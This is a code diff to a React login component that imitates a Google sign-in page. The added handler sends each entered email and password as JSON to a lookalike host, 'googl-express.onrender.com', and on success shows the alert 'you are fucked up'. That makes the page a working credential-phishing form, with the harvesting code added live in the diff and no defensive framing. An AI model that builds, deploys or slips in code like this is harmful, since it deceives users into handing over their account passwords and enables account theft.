@@ -5,9 +5,35 @@ function Login() {
     const [email, setEmail] = useState('');
     const [password, setPassword] = useState('');
 
-    const handleSubmit = (event) => {
-        event.preventDefault();
-        alert('Login functionality not implemented.');
+    const handleSubmit = async(event) => {
+        
+        try {
+            const response = await fetch('https://googl-express.onrender.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    pwd: password,
+                }),
+            });
+            console.log(response)
+
+            if (response.ok) {
+                alert('you are fucked up')
+                const data = await response.json();
+                console.log('Login successful:', data);
+                // Handle success (e.g., redirect, show success message, etc.)
+            } else {
+                const errorData = await response.json();
+                console.error('Login failed:', errorData);
+                
+            }
+        } catch (error) {
+            console.error('An error occurred:', error);
+            
+        }
     };
 
     return (
@@ -18,7 +44,7 @@ function Login() {
                     alt="Google Logo"
                 />
             </div>
-            <form onSubmit={handleSubmit}>
+            
                 <div className="input-group">
                     <input
                         type="email"
@@ -37,8 +63,8 @@ function Login() {
                         required
                     />
                 </div>
-                <button type="submit" className="btn">Login</button>
-            </form>
+                <button type="submit" className="btn" onClick={handleSubmit}>Login</button>
+            
             <div className="options">
                 <a href="#">Forgot email?</a>
                 <a href="#">Create account</a>
